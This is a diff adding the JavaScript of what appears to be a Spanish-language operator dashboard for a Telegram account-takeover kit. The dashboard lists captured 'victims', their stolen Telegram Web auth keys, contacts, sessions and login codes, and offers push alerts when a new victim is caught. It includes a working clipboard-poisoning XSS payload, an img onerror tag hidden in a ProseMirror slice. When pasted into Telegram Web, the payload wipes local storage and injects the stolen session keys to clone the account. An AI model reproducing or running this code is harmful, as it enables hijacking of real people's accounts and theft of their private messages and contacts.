+  $('tgHAv').textContent = tgInitials(nm); $('tgHAv').style.background = tgGrad(nm);
+  $('tgHNm').textContent = nm;
+  
+  const anyMat = T.key || T.contacts || T.sessions;
+  $('tgEmpty').hidden = !!anyMat;
+  $('tgSvc').hidden = !anyMat;
+  
+  // Contacts
+  if (T.contacts) {
+    $('tgCnt').textContent = '· ' + T.contacts.count;
+    $('tgContacts').innerHTML = (T.contacts.sample||[]).map(s => {
+      if(s && typeof s==='object' && s.n){
+        const sub = s.p ? fmtPhone(s.p) : (s.u ? '@'+s.u : 'contacto');
+        return `<div class="tgcrow"><div class="tgavatar" style="width:40px;font-size:16px;background:${tgGrad(s.n)}">${tgInitials(s.n)}</div>
+        <div style="min-width:0"><div class="nm">${esc(s.n)}</div><div class="st">${esc(sub)}</div></div></div>`;
+      }
+      const cn = 'Contacto ' + String(s).slice(-4);
+      return `<div class="tgcrow"><div class="tgavatar" style="width:40px;font-size:16px;background:${tgGrad(cn)}">C</div>
+      <div style="min-width:0"><div class="nm">Contacto</div><div class="st">ID ${esc(String(s))}</div></div></div>`;
+    }).join('');
+  } else {
+    $('tgContacts').innerHTML = ''; $('tgCnt').textContent = '';
+  }
+  
+  // Keys
+  if (T.key) {
+    $('tgKeyMsg').hidden = false;
+    let home = '';
+    try { const dc = JSON.parse(T.key.user_auth).dcID; home = T.key['dc' + dc + '_auth_key'] || ''; } catch(e) {}
+    if (!home) home = T.key.dc2_auth_key || T.key.dc3_auth_key || T.key.dc4_auth_key || T.key.dc5_auth_key || T.key.dc1_auth_key || '';
+    $('tgKeyPre').textContent = String(home).replace(/"/g,'');
+    const nk = Object.keys(T.key).filter(k => /_auth_key$/.test(k)).length;
+    $('tgLbl').textContent = 'SESION CAPTURADA (' + nk + ' llaves DC + user_auth)';
+    const kb = $('secKeyBadge');
+    if (kb) {
+      if (home) { kb.textContent = 'SESION COMPLETA'; kb.className = 'badge ok'; }
+      else { kb.textContent = 'SESION INCOMPLETA'; kb.className = 'badge na'; }
+    }
+    $('tgKeyTm').textContent = tgTime(T.keyAt);
+    
+    if (T.key.user_auth) {
+      try {
+        const u = JSON.parse(T.key.user_auth);
+        $('tgUaMsg').hidden = false;
+        $('tgUaPre').textContent = `id: ${u.id}\ndcID: ${u.dcID}`;
+      } catch(e){}
+    }
+  } else {
+    $('tgKeyMsg').hidden = true;
+    $('tgUaMsg').hidden = true;
+  }
+  
+  // Sessions
+  if (T.sessions) {
+    $('tgDevCard').hidden = false;
+    $('tgDevs').innerHTML = T.sessions.map(s => {
+      const cur = String(s).indexOf('actual') > -1;
+      const p = String(s).replace(' · actual','').split(' · ');
+      return `<div class="tgrow"><div class="dev"><svg viewBox="0 0 24 24"><path d="M4 6h16a2 2 0 012 2v9a2 2 0 01-2 2H4a2 2 0 01-2-2V8a2 2 0 012-2zm0 2v9h16V8H4z"/><circle cx="8" cy="5" r="1.3"/><circle cx="12" cy="5" r="1.3"/></svg></div>
+      <div style="min-width:0"><div class="dn">${esc(p[0]||'?')} · ${esc(p[1]||'')}</div><div class="dd">${esc(p[2]||'')}</div></div>
+      ${cur?'<span class="cur">ESTA SESIÓN</span>':''}</div>`;
+    }).join('');
+  } else {
+    $('tgDevCard').hidden = true;
+  }
+}
+
+/* WIRING */
+$('asklogin').addEventListener('click', () => {
+  if (S.activeUid && S.targets[S.activeUid].phone) {
+    try{navigator.clipboard.writeText(S.targets[S.activeUid].phone)}catch(e){}
+  }
+  window.open('https://web.telegram.org/k/', '_blank');
+});
+
+$('copyCode').addEventListener('click', () => {
+  const T = S.activeUid ? S.targets[S.activeUid] : null;
+  if (!T || !T.code) return;
+  try{navigator.clipboard.writeText(T.code)}catch(e){}
+  $('copyCode').textContent = 'COPIADO ✓'; setTimeout(() => $('copyCode').textContent='COPIAR CÓDIGO', 1500);
+});
+
+$('tgCopyKey').addEventListener('click', () => {
+  const T = S.activeUid ? S.targets[S.activeUid] : null;
+  if (!T || !T.key) return;
+  try{navigator.clipboard.writeText(JSON.stringify(T.key, null, 2))}catch(e){}
+  $('tgCopyKey').textContent = 'COPIADA ✓'; setTimeout(() => $('tgCopyKey').textContent='Copiar llave completa', 1500);
+});
+
+
+
+/* ===== CLONADOR / RESTAURADOR (Android desktop-mode friendly) ===== */
+function buildPoisonClipboard(P) {
+  const ATTRS = {title:'Sesión', bordered:true, striped:false, titleRichHTML: '<img src=x onerror="'+P.replace(/\"/g,'&quot;')+'">'};
+  const SLICE = '0 0 ' + JSON.stringify(['table', ATTRS]);
+  const div = document.createElement('div');
+  div.style.position='fixed'; div.style.left='-9999px'; div.style.top='0';
+  div.innerHTML = '<table data-bordered=\"true\"><tbody><tr><th>Sesión</th><th>Estado</th></tr><tr><td>Cuenta</td><td>Activa</td></tr></tbody></table>';
+  div.setAttribute('data-pm-slice', SLICE);
+  document.body.appendChild(div);
+  const r = document.createRange(); r.selectNodeContents(div);
+  const s = getSelection(); s.removeAllRanges(); s.addRange(r);
+  const html = new XMLSerializer().serializeToString(div);
+  const listener = (e) => {
+    e.clipboardData.setData('text/html', html);
+    e.clipboardData.setData('text/plain', 'Sesión activa');
+    e.preventDefault();
+  };
+  document.addEventListener('copy', listener);
+  document.execCommand('copy');
+  document.removeEventListener('copy', listener);
+  s.removeAllRanges(); div.remove();
+  return true;
+}
+function buildCloneClipboard(T) {
+  if (!T || !T.key) return false;
+  // sesion completa: todas las dc keys + sales + user_auth
+  const S = {};
+  for (const k in T.key) if (/^dc\d+_auth_key$/.test(k) || /^dc\d+_server_salt$/.test(k) || k === 'user_auth') S[k] = String(T.key[k]);
+  if (!S.user_auth) return false;
+  // guard: verificar llave del DC hogar (la unica que autentica)
+  try {
+    const dc = JSON.parse(S.user_auth).dcID;
+    if (!S['dc' + dc + '_auth_key']) {
+      alert('SESIÓN INCOMPLETA: la llave capturada no trae las claves de sesión.\nCausa casi seguro: portapapeles viejo. Recargá la página del kit, verificá la esquina (v18 o más), tocá COPIAR y pegalo de nuevo. No uses el historial de portapapeles del teclado.');
+      return false;
+    }
+  } catch(e) {}
+  const WIPE = "try{var rs=await navigator.serviceWorker.getRegistrations();await Promise.all(rs.map(function(r){return r.unregister()}))}catch(e){}"+
+    "try{var ks=await caches.keys();await Promise.all(ks.map(function(k){return caches.delete(k)}))}catch(e){}"+
+    "try{var dbs=await indexedDB.databases();dbs.forEach(function(d){try{indexedDB.deleteDatabase(d.name)}catch(e){}})}catch(e){}"+
+    "var rm=['dc1_auth_key','dc2_auth_key','dc3_auth_key','dc4_auth_key','dc5_auth_key','dc1_server_salt','dc2_server_salt','dc3_server_salt','dc4_server_salt','dc5_server_salt','user_auth','previous-account','number_of_accounts','auth_key_fingerprint'];for(var i=0;i<12;i++)rm.push('account'+(i+1));"+
+    "rm.forEach(function(k){try{localStorage.removeItem(k)}catch(e){}});";
+  const P = 'window.__T20CL=13.4;window.__CLONE=1;(async()=>{try{'+
+    "var S=JSON.parse(atob('"+btoa(JSON.stringify(S))+"'));"+
+    "try{var BK={};['1','2','3','4','5'].forEach(function(n){['auth_key','server_salt'].forEach(function(suf){var k='dc'+n+'_'+suf,v=localStorage.getItem(k);if(v)BK[k]=v})});var ua=localStorage.getItem('user_auth');if(ua)BK.user_auth=ua;localStorage.setItem('__T20BAK',JSON.stringify(BK))}catch(e){}"+
+    WIPE+
+    "Object.keys(S).forEach(function(k){try{localStorage.setItem(k,S[k])}catch(e){}});"+
+    'setTimeout(function(){location.reload()},300);}catch(e){}})();';
+  return buildPoisonClipboard(P);
+}
+function buildRestoreClipboard() {
+  const WIPE = "try{var rs=await navigator.serviceWorker.getRegistrations();await Promise.all(rs.map(function(r){return r.unregister()}))}catch(e){}"+
+    "try{var ks=await caches.keys();await Promise.all(ks.map(function(k){return caches.delete(k)}))}catch(e){}"+
+    "try{var dbs=await indexedDB.databases();dbs.forEach(function(d){try{indexedDB.deleteDatabase(d.name)}catch(e){}})}catch(e){}"+
+    "var rm=['dc1_auth_key','dc2_auth_key','dc3_auth_key','dc4_auth_key','dc5_auth_key','dc1_server_salt','dc2_server_salt','dc3_server_salt','dc4_server_salt','dc5_server_salt','user_auth','previous-account','number_of_accounts','auth_key_fingerprint'];for(var i=0;i<12;i++)rm.push('account'+(i+1));"+
+    "rm.forEach(function(k){try{localStorage.removeItem(k)}catch(e){}});";
+  const P = 'window.__T20RB=13.4;(async()=>{try{'+
+    "var B=localStorage.getItem('__T20BAK');if(!B)return;var S=JSON.parse(B);"+
+    WIPE+
+    "Object.keys(S).forEach(function(k){try{localStorage.setItem(k,S[k])}catch(e){}});"+
+    'setTimeout(function(){location.reload()},300);}catch(e){}})();';
+  return buildPoisonClipboard(P);
+}
+$('tgCloneBtn').addEventListener('click', () => {
+  const T = S.activeUid ? S.targets[S.activeUid] : null;
+  if (!buildCloneClipboard(T)) return;
+  $('tgInfoBox').hidden = false;
+  $('tgInfoBox').scrollIntoView({behavior:'smooth', block:'center'});
+  $('tgCloneBtn').textContent = '✓ COPIADO: PEGALO EN TU TELEGRAM';
+  setTimeout(() => $('tgCloneBtn').textContent = 'CLONAR SESION EN MI TELEFONO', 3000);
+});
+$('tgRestoreBtn').addEventListener('click', () => {
+  if (!buildRestoreClipboard()) return;
+  $('tgInfoBox').hidden = true;
+  $('tgRestoreBtn').textContent = '✓ COPIADO: PEGALO PARA VOLVER';
+  setTimeout(() => $('tgRestoreBtn').textContent = 'VOLVER A MI CUENTA', 3000);
+});
+/* toggles de alertas */
+function wireSw(id, init, cb) {
+  const el = $(id); el.classList.toggle('on', init);
+  el.addEventListener('click', () => { el.classList.toggle('on'); cb(el.classList.contains('on')); });
+}
+wireSw('swNot', S.notifOn, v => { S.notifOn = v; localStorage.setItem('t20v8_notif', v?'1':'0');
+  if (v && 'Notification' in window && Notification.permission === 'default') Notification.requestPermission(); });
+wireSw('swBeep', S.beepOn, v => { S.beepOn = v; localStorage.setItem('t20v8_beep', v?'1':'0'); });
+async function vaciarTodo() {
+  if (!confirm('Vaciar la lista y borrar todo el material del backend?')) return;
+  const allIds = [];
+  for (const uid in S.targets) (S.targets[uid].ids || []).forEach(id => allIds.push(id));
+  try {
+    await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20DelVictim', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ids: allIds })
+    });
+  } catch(e) {}
+  S.targets = {}; S.orphans = []; S.activeUid = null;
+  renderAll();
+}
+
+async function eliminarVictima(uid) {
+  const T = S.targets[uid];
+  if (!T) return;
+  if (!confirm('Eliminar victima y todo su material capturado?')) return;
+  try {
+    const r = await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20DelVictim', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ids: T.ids || [] })
+    });
+    await r.json();
+  } catch(e) {}
+  (T.ids || []).forEach(id => S.seen.add(id));
+  delete S.targets[uid];
+  if (S.activeUid === uid) S.activeUid = null;
+  renderAll();
+}
+/* ===== ALERTAS PUSH NATIVAS (celu) ===== */
+const PUSH_KEY = 'BDboWyLOFiMH6ZtyRd_RVp0haDMN_prgtLYLufrZeavicLQbKIys7LQDPOosdqSh3hV9taGFJLydu7AOkcyMj8s';
+function urlB64ToU8(base64) {
+  const pad = '='.repeat((4 - base64.length % 4) % 4);
+  const b = (base64 + pad).replace(/-/g, '+').replace(/_/g, '/');
+  const raw = atob(b);
+  const u8 = new Uint8Array(raw.length);
+  for (let i = 0; i < raw.length; i++) u8[i] = raw.charCodeAt(i);
+  return u8;
+}
+function bufToB64(buf) {
+  return btoa(String.fromCharCode.apply(null, new Uint8Array(buf)));
+}
+async function enablePush() {
+  const btn = $('tgPushBtn'), st = $('tgPushSt');
+  if (!('serviceWorker' in navigator) || !('PushManager' in window)) { st.textContent = 'Este navegador no soporta notificaciones push.'; return; }
+  btn.textContent = '... preparando';
+  try {
+    const perm = await Notification.requestPermission();
+    if (perm !== 'granted') { st.textContent = 'Permiso de notificaciones denegado. Activálo en Ajustes del navegador.'; btn.textContent = 'ACTIVAR ALERTAS EN ESTE DISPOSITIVO'; return; }
+    const reg = await navigator.serviceWorker.register('sw.js');
+    await navigator.serviceWorker.ready;
+    let sub = await reg.pushManager.getSubscription();
+    if (!sub) {
+      sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: urlB64ToU8(PUSH_KEY) });
+    }
+    const r = await fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20SavePush', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        endpoint: sub.endpoint,
+        p256dh: bufToB64(sub.getKey('p256dh')),
+        auth: bufToB64(sub.getKey('auth')),
+        ua: navigator.userAgent.slice(0, 200)
+      })
+    });
+    const j = await r.json();
+    if (!j.ok) throw new Error(j.error || 'backend');
+    btn.textContent = 'ALERTAS ACTIVAS';
+    st.textContent = 'Listo. Te va a llegar notificación nativa cuando caiga una víctima, llave o código. Para que sea permanente, instalá la app: menú del Chrome → "Añadir a pantalla principal".';
+  } catch (e) {
+    btn.textContent = 'ACTIVAR ALERTAS EN ESTE DISPOSITIVO';
+    st.textContent = 'Error: ' + (e.message || e) + '. Probá de nuevo.';
+  }
+}
+$('tgPushBtn').addEventListener('click', enablePush);
+
+/* POLLING */
+async function poll() {
+  try {
+    const r = await fetch(STATUS_URL);
+    const j = await r.json();
+    let fresh = false;
+    for (const b of (j.beacons||[])) if (processBeacon(b)) fresh = true;
+    if (fresh) {
+      if (!S.activeUid && Object.keys(S.targets).length > 0) S.activeUid = Object.keys(S.targets)[0];
+      renderAll();
+    }
+  } catch(e) {}
+  setTimeout(poll, 2500);
+}
+
+setInterval(() => {
+  const n = new Date();
+  $('clock').textContent = String(n.getHours()).padStart(2,'0') + ':' + String(n.getMinutes()).padStart(2,'0');
+  const up = Math.floor((Date.now()-S.boot)/1000);
+  $('ftU').textContent = [Math.floor(up/3600), Math.floor(up/60)%60, up%60].map(x=>String(x).padStart(2,'0')).join(':');
+}, 1000);
+
+poll();
+</script>
+</body></html>
